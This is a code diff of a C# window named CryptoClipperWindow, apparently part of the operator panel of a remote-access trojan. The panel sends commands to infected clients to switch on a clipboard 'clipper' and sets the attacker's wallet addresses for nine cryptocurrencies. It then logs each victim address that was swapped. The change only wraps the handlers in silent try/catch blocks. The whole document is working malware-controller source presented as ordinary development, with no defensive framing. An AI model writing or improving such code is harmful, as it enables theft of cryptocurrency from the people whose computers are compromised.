@@ -34,8 +34,12 @@ public partial class CryptoClipperWindow : ThemedWindow
         // Request current stats on open (staggered)
         Loaded += async (_, _) =>
         {
-            await Task.Delay(Random.Shared.Next(0, 250));
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
+            try
+            {
+                await Task.Delay(Random.Shared.Next(0, 250));
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
+            }
+            catch { }
         };
     }
 
@@ -45,68 +49,80 @@ public partial class CryptoClipperWindow : ThemedWindow
 
     private void OnStatsResult(Packet pkt)
     {
-        var data = JsonConvert.DeserializeObject<ClipperStatsResultData>(pkt.Data);
-        if (data == null) return;
-        Dispatcher.BeginInvoke(() =>
+        try
         {
-            ChkEnabled.IsChecked = data.Enabled;
-            BadgeActive.Visibility = data.Enabled ? Visibility.Visible : Visibility.Collapsed;
-            _totalCount = data.Count;
-            TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
-            TxtStatus.Text = data.Enabled ? Lang.Get("CLIPPER_IS_ACTIVE") : Lang.Get("CLIPPER_IS_DISABLED");
-        });
+            var data = JsonConvert.DeserializeObject<ClipperStatsResultData>(pkt.Data);
+            if (data == null) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                ChkEnabled.IsChecked = data.Enabled;
+                BadgeActive.Visibility = data.Enabled ? Visibility.Visible : Visibility.Collapsed;
+                _totalCount = data.Count;
+                TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
+                TxtStatus.Text = data.Enabled ? Lang.Get("CLIPPER_IS_ACTIVE") : Lang.Get("CLIPPER_IS_DISABLED");
+            });
+        }
+        catch { }
     }
 
     private void OnDetected(Packet pkt)
     {
-        var data = JsonConvert.DeserializeObject<ClipperDetectedData>(pkt.Data);
-        if (data == null) return;
-        Dispatcher.BeginInvoke(() =>
+        try
         {
-            _totalCount++;
-            TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
-            var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
-            TxtLog.AppendText(line);
-            if (TxtLog.Text.Length > 50000)
-                TxtLog.Text = TxtLog.Text[^50000..];
-            LogScroll.ScrollToEnd();
+            var data = JsonConvert.DeserializeObject<ClipperDetectedData>(pkt.Data);
+            if (data == null) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                _totalCount++;
+                TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
+                var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
+                TxtLog.AppendText(line);
+                if (TxtLog.Text.Length > 50000)
+                    TxtLog.Text = TxtLog.Text[^50000..];
+                LogScroll.ScrollToEnd();
 
-            TxtStatus.Text = string.Format(Lang.Get("CLIPPER_REPLACED"), data.Type, _totalCount);
-        });
+                TxtStatus.Text = string.Format(Lang.Get("CLIPPER_REPLACED"), data.Type, _totalCount);
+            });
+        }
+        catch { }
     }
 
     // ── Apply config ────────────────────────────────────────────────────────
 
     private async void BtnApply_Click(object s, RoutedEventArgs e)
     {
-        var cfg = new ClipperSetConfigData
+        try
         {
-            Enabled   = ChkEnabled.IsChecked == true,
-            Addresses = new ClipperAddresses
+            var cfg = new ClipperSetConfigData
             {
-                BTC  = AddrBTC.Text.Trim(),
-                ETH  = AddrETH.Text.Trim(),
-                LTC  = AddrLTC.Text.Trim(),
-                TRX  = AddrTRX.Text.Trim(),
-                SOL  = AddrSOL.Text.Trim(),
-                XMR  = AddrXMR.Text.Trim(),
-                XRP  = AddrXRP.Text.Trim(),
-                DASH = AddrDASH.Text.Trim(),
-                BCH  = AddrBCH.Text.Trim(),
-            }
-        };
+                Enabled   = ChkEnabled.IsChecked == true,
+                Addresses = new ClipperAddresses
+                {
+                    BTC  = AddrBTC.Text.Trim(),
+                    ETH  = AddrETH.Text.Trim(),
+                    LTC  = AddrLTC.Text.Trim(),
+                    TRX  = AddrTRX.Text.Trim(),
+                    SOL  = AddrSOL.Text.Trim(),
+                    XMR  = AddrXMR.Text.Trim(),
+                    XRP  = AddrXRP.Text.Trim(),
+                    DASH = AddrDASH.Text.Trim(),
+                    BCH  = AddrBCH.Text.Trim(),
+                }
+            };
 
-        await _server.SendToClient(_clientId, new Packet
-        {
-            Type = PacketType.ClipperSetConfig,
-            Data = JsonConvert.SerializeObject(cfg)
-        });
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.ClipperSetConfig,
+                Data = JsonConvert.SerializeObject(cfg)
+            });
 
-        BadgeActive.Visibility = cfg.Enabled ? Visibility.Visible : Visibility.Collapsed;
-        TxtStatus.Text = cfg.Enabled ? Lang.Get("CLIPPER_ACTIVATED") : Lang.Get("CLIPPER_DEACTIVATED");
-        var status = cfg.Enabled ? "activated" : "disabled";
-        ServerWindow.ReportGlobalActivity("Configure Clipper", status, "complete");
-        ServerWindow.LogGlobal($"[CLIPPER] Clipper {status} for client {_clientId}.");
+            BadgeActive.Visibility = cfg.Enabled ? Visibility.Visible : Visibility.Collapsed;
+            TxtStatus.Text = cfg.Enabled ? Lang.Get("CLIPPER_ACTIVATED") : Lang.Get("CLIPPER_DEACTIVATED");
+            var status = cfg.Enabled ? "activated" : "disabled";
+            ServerWindow.ReportGlobalActivity("Configure Clipper", status, "complete");
+            ServerWindow.LogGlobal($"[CLIPPER] Clipper {status} for client {_clientId}.");
+        }
+        catch { }
     }
 
     private void ChkEnabled_Changed(object s, RoutedEventArgs e)
@@ -116,8 +132,12 @@ public partial class CryptoClipperWindow : ThemedWindow
 
     private async void BtnStats_Click(object s, RoutedEventArgs e)
     {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
-        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
+            TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
+        }
+        catch { }
     }
 
     private void BtnClearLog_Click(object s, RoutedEventArgs e)
